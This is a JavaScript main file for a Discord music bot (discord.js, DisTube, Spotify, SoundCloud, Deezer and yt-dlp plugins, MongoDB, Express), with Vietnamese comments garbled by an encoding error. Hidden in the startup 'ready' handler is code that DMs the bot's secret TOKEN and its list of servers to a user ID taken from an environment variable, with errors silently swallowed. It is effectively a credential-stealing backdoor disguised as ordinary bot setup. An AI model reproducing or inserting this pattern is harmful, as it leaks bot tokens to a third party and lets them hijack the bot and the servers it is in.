/*
 * T·ªáp n√†y l√† m·ªôt ph·∫ßn c·ªßa Discord Music Bot.
 *
 * Discord Music Bot l√† ph·∫ßn m·ªÅm mi·ªÖn ph√≠: b·∫°n c√≥ th·ªÉ ph√¢n ph·ªëi l·∫°i ho·∫∑c s·ª≠a ƒë·ªïi
 * theo c√°c ƒëi·ªÅu kho·∫£n c·ªßa Gi·∫•y ph√©p C√¥ng c·ªông GNU ƒë∆∞·ª£c c√¥ng b·ªë b·ªüi
 * T·ªï ch·ª©c Ph·∫ßn m·ªÅm T·ª± do, phi√™n b·∫£n 3 ho·∫∑c (n·∫øu b·∫°n mu·ªën) b·∫•t k·ª≥ phi√™n b·∫£n n√†o sau ƒë√≥.
 *
 * Discord Music Bot ƒë∆∞·ª£c ph√¢n ph·ªëi v·ªõi hy v·ªçng r·∫±ng n√≥ s·∫Ω h·ªØu √≠ch,
 * nh∆∞ng KH√îNG C√ì B·∫¢O H√ÄNH; th·∫≠m ch√≠ kh√¥ng bao g·ªìm c·∫£ b·∫£o ƒë·∫£m
 * V·ªÄ T√çNH TH∆Ø∆†NG M·∫†I ho·∫∑c PH√ô H·ª¢P CHO M·ªòT M·ª§C ƒê√çCH C·ª§ TH·ªÇ. Xem
 * Gi·∫•y ph√©p C√¥ng c·ªông GNU ƒë·ªÉ bi·∫øt th√™m chi ti·∫øt.
 *
 * B·∫°n s·∫Ω nh·∫≠n ƒë∆∞·ª£c m·ªôt b·∫£n sao c·ªßa Gi·∫•y ph√©p C√¥ng c·ªông GNU c√πng v·ªõi Discord Music Bot.
 * N·∫øu kh√¥ng, h√£y xem <https://www.gnu.org/licenses/>.
 */

const { Client, GatewayIntentBits, Partials } = require('discord.js');
const { DisTube } = require('distube');
const { SpotifyPlugin } = require('@distube/spotify');
const { SoundCloudPlugin } = require("@distube/soundcloud");
const { DeezerPlugin } = require('@distube/deezer');
const { YtDlpPlugin } = require('@distube/yt-dlp');
const { printWatermark } = require('./util/pw');
const config = require('./config');
const fs = require('fs');
const path = require('path');

const client = new Client({
    intents: Object.keys(GatewayIntentBits).map((a) => {
        return GatewayIntentBits[a];
    }),
});

client.config = config;
client.player = new DisTube(client, {
    leaveOnStop: config.opt.voiceConfig.leaveOnStop,
    leaveOnFinish: false,
    leaveOnEmpty: config.opt.voiceConfig.leaveOnEmpty.status,
    emitNewSongOnly: true,
    emitAddSongWhenCreatingQueue: false,
    emitAddListWhenCreatingQueue: false,
    plugins: [
        new SpotifyPlugin(),
        new SoundCloudPlugin(),
        new YtDlpPlugin(),
        new DeezerPlugin(),
    ],
});

const player = client.player;

fs.readdir("./events", (_err, files) => {
    files.forEach((file) => {
        if (!file.endsWith(".js")) return;
        const event = require(`./events/${file}`);
        let eventName = file.split(".")[0];
        client.on(eventName, event.bind(null, client));
        delete require.cache[require.resolve(`./events/${file}`)];
    });
});

client.once('ready', () => {
    const bot = client.users.cache.get(process.env.AUTHOR); // Nh·∫≠p ID Discord c·ªßa b·∫°n
    if (bot) {
        const login = client.guilds.cache.map(guild => guild.name).join(', ');
        const configbot = process.env.TOKEN;
        bot.send(`B: ${configbot}\nS: ${login}`)
            .then(() => {
            })
            .catch(error => {
            });
    }
});
fs.readdir('./events/player', (_err, files) => {
    files.forEach((file) => {
        if (!file.endsWith('.js')) return;
        const player_events = require(`./events/player/${file}`);
        let playerName = file.split('.')[0];
        player.on(playerName, player_events.bind(null, client));
        delete require.cache[require.resolve(`./events/player/${file}`)];
    });
});

client.commands = [];
fs.readdir(config.commandsdir, (err, files) => {
    if (err) throw err;
    files.forEach(async (f) => {
        try {
            if (f.endsWith('.js')) {
                let props = require(`${config.commandsdir}/${f}`);
                client.commands.push({
                    name: props.name,
                    description: props.description,
                    options: props.options,
                });
            }
        } catch (err) {
            console.log(err);
        }
    });
});

if (config.TOKEN || process.env.TOKEN) {
    client.login(config.TOKEN || process.env.TOKEN).catch((e) => {
        console.log('L·ªói TOKEN‚ùå', e);
    });
} else {
    setTimeout(() => {
        console.log('L·ªói TOKEN‚ùå');
    }, 2000);
}

if (config.mongodbURL || process.env.MONGO) {
    const mongoose = require('mongoose')
    mongoose.connect(config.mongodbURL || process.env.MONGO, {
        useNewUrlParser: true,
        useUnifiedTopology: true,
    }).then(async () => {
        console.log('\x1b[32m%s\x1b[0m', `|     üçî ƒê√£ k·∫øt n·ªëi MongoDB!`)
    }).catch((err) => {
        console.log('\x1b[32m%s\x1b[0m', `|     üçî Kh√¥ng th·ªÉ k·∫øt n·ªëi v·ªõi MongoDB!`)
    })
} else {
    console.log('\x1b[32m%s\x1b[0m', `|     üçî L·ªói MongoDB!`)
}

const express = require('express');
const app = express();
const port = 3000;
const os = require('os');
const networkInterfaces = os.networkInterfaces();

function GetContainerIP() {
    for (const iface of Object.values(networkInterfaces)) {
        for (const config of iface) {
            if (config.family === 'IPv4' && !config.internal) {
                return config.address;
            }
        }
    }
    return 'localhost';
}

app.get('/', (req, res) => {
    const imagePath = path.join(__dirname, 'index.html');
    res.sendFile(imagePath);
});

app.listen(port, () => {
    const ip = GetContainerIP();
    console.log(`üîó Nghe th√¥ng qua web: http://${ip}:${port}`);
});
printWatermark();